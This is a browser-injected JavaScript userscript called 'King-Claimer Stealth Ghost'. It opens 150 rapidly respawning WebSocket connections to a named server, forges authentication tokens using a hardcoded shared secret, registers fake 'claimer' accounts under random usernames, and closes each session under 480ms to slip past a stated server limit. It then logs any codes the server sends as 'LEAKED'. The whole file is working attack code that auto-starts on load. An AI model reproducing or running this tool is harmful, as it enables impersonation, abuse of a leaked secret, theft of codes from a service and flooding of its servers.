// ==========================================
// KING-CLAIMER STEALTH GHOST - SINGLE FILE WITH GUI
// Save as claim.js and inject or use as userscript
// ==========================================
const SERVER_URL = "wss://kingclaimer.xyz:8443/";
const TOTAL_CLIENTS = 150;
const RECONNECT_DELAY = 50;           // Very fast respawn
const SESSION_LIFETIME = 480;         // ~480ms max per connection (under 500ms limit)
const SHARED_SECRET = "vipxK9mP2vL8nQ4wRjT5bYc";
let clients = [];
let isRunning = false;
let activeCount = 0;

// Create GUI
function createGUI() {
    if (document.getElementById('kingclaimer-gui')) return;
    const panel = document.createElement('div');
    panel.id = 'kingclaimer-gui';
    panel.style.cssText = `
        position: fixed; top: 10px; right: 10px; width: 440px; height: 620px;
        background: rgba(15,15,15,0.97); border: 2px solid #00ff00; border-radius: 8px;
        box-shadow: 0 0 25px #00ff00; z-index: 2147483647; overflow: hidden; font-family: monospace;
    `;
    panel.innerHTML = `
        <div style="background:#111; padding:12px; text-align:center; font-weight:bold; border-bottom:1px solid #00ff00;">
            🔥 KING-CLAIMER STEALTH GHOST 🔥
        </div>
        <div style="padding:10px; display:flex; gap:8px; background:#1a1a1a;">
            <button id="kc-start" style="flex:1; padding:12px; background:#00ff00; color:black; border:none; font-weight:bold; cursor:pointer;">START GHOST</button>
            <button id="kc-stop" style="flex:1; padding:12px; background:#ff0000; color:white; border:none; font-weight:bold; cursor:pointer;">STOP ALL</button>
        </div>
        <div id="kc-log" style="height:460px; overflow-y:auto; padding:10px; background:#000; font-size:13px; line-height:1.5;"></div>
        <div style="padding:8px; text-align:center; background:#111; border-top:1px solid #00ff00; font-size:14px;">
            Active: <span id="kc-count">0</span> | Status: <span id="kc-status">Ready</span>
        </div>
    `;
    document.body.appendChild(panel);

    const logContainer = document.getElementById('kc-log');
    window.kcLog = function(message, type = 'info') {
        const entry = document.createElement('div');
        entry.style.margin = '2px 0';
        if (type === 'success') entry.style.color = '#00ff00';
        else if (type === 'error') entry.style.color = '#ff4444';
        else if (type === 'warn') entry.style.color = '#ffff00';
        entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
        logContainer.appendChild(entry);
        logContainer.scrollTop = logContainer.scrollHeight;
    };

    document.getElementById('kc-start').addEventListener('click', startGhost);
    document.getElementById('kc-stop').addEventListener('click', stopGhost);
}

function log(message, type = 'info') {
    if (typeof window.kcLog === 'function') {
        window.kcLog(message, type);
    } else {
        console.log(message);
    }
}

// ==========================================
// HELPERS
// ==========================================
function generateRandomUsername() {
    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    const length = 8 + Math.floor(Math.random() * 5);
    let username = "";
    for (let i = 0; i < length; i++) {
        username += chars[Math.floor(Math.random() * chars.length)];
    }
    return username;
}

async function generateHMACAuthToken(username) {
    const serverTime = Math.floor(Date.now() / 1000);
    const message = `${username}:${serverTime}`;
    const key = await crypto.subtle.importKey(
        "raw", new TextEncoder().encode(SHARED_SECRET),
        { name: "HMAC", hash: "SHA-256" }, false, ["sign"]
    );
    const signature = await crypto.subtle.sign("HMAC", key, new TextEncoder().encode(message));
    const sigHex = Array.from(new Uint8Array(signature))
        .map(b => b.toString(16).padStart(2, '0')).join('');
    return `${serverTime}:${sigHex}`;
}

// ==========================================
// STRESS CLIENT (Short-lived + Parallel)
// ==========================================
class StressClient {
    constructor(id) {
        this.clientID = id;
        this.username = null;
        this.ws = null;
        this.running = true;
    }

    async connect() {
        if (!this.running) return;

        this.username = generateRandomUsername();
        const authToken = await generateHMACAuthToken(this.username);
        const url = new URL(SERVER_URL);
        url.searchParams.set("username", this.username);
        url.searchParams.set("nonce", authToken);

        log(`[Client ${this.clientID}] Connecting as ${this.username}`);

        try {
            this.ws = new WebSocket(url.toString());

            this.ws.onopen = () => {
                activeCount++;
                document.getElementById('kc-count').textContent = activeCount;

                log(`✅ [Client ${this.clientID}] Connected`, 'success');

                const regPayload = {
                    type: "register",
                    role: "claimer",
                    username: this.username
                };
                this.ws.send(JSON.stringify(regPayload));

                // Short burst of pings
                let pingCount = 0;
                const pingInterval = setInterval(() => {
                    if (this.ws && this.ws.readyState === WebSocket.OPEN && pingCount < 6) {
                        this.ws.send(JSON.stringify({ type: "ping" }));
                        pingCount++;
                    } else {
                        clearInterval(pingInterval);
                    }
                }, 60);
            };

            this.ws.onmessage = (event) => {
                try {
                    const data = JSON.parse(event.data);
                    if (data.type === "ping") {
                        this.ws.send(JSON.stringify({ type: "pong" }));
                    }
                    if (data.code) {
                        log(`🔥 [LEAKED]: ${data.code} 🔥`, 'success');
                    }
                    if (data.message === "Authentication failed" || data.code === "INVALID_USERNAME") {
                        log(`🛑 [Client ${this.clientID}] Auth failed`, 'error');
                    }
                } catch (e) {}
            };

            this.ws.onclose = () => {
                activeCount = Math.max(0, activeCount - 1);
                document.getElementById('kc-count').textContent = activeCount;
                this.cleanup();
                if (this.running) {
                    setTimeout(() => this.connect(), RECONNECT_DELAY);
                }
            };

            this.ws.onerror = () => {
                this.cleanup();
                if (this.running) {
                    setTimeout(() => this.connect(), RECONNECT_DELAY);
                }
            };

            // Force close after SESSION_LIFETIME to stay under 500ms
            setTimeout(() => {
                if (this.ws && this.ws.readyState === WebSocket.OPEN) {
                    this.ws.close();
                }
            }, SESSION_LIFETIME);

        } catch (e) {
            this.cleanup();
            if (this.running) {
                setTimeout(() => this.connect(), RECONNECT_DELAY);
            }
        }
    }

    cleanup() {
        if (this.ws) {
            this.ws.onopen = null;
            this.ws.onmessage = null;
            this.ws.onclose = null;
            this.ws.onerror = null;
            if (this.ws.readyState === WebSocket.OPEN || this.ws.readyState === WebSocket.CONNECTING) {
                this.ws.close();
            }
            this.ws = null;
        }
    }
}

// ==========================================
// START / STOP
// ==========================================
async function startGhost() {
    if (isRunning) return;
    isRunning = true;
    clients = [];
    activeCount = 0;
    document.getElementById('kc-count').textContent = "0";
    log("🚀 Starting KingClaimer Stealth Ghost (Parallel Mode)...", 'success');

    // Much more parallel startup
    for (let i = 0; i < TOTAL_CLIENTS; i++) {
        const client = new StressClient(i);
        clients.push(client);
        // Very small stagger to avoid browser throttling
        setTimeout(() => client.connect(), i * 8);
    }
}

function stopGhost() {
    isRunning = false;
    clients.forEach(client => {
        client.running = false;
        client.cleanup();
    });
    activeCount = 0;
    document.getElementById('kc-count').textContent = "0";
    log("⛔ All clients stopped.", 'error');
}

// Initialize GUI and auto-start
createGUI();
setTimeout(() => {
    startGhost();
}, 800);

console.log("%c✅ KingClaimer Ghost loaded with GUI (Fixed Parallel + Short-lived)", "color:#00ff00; font-weight:bold");
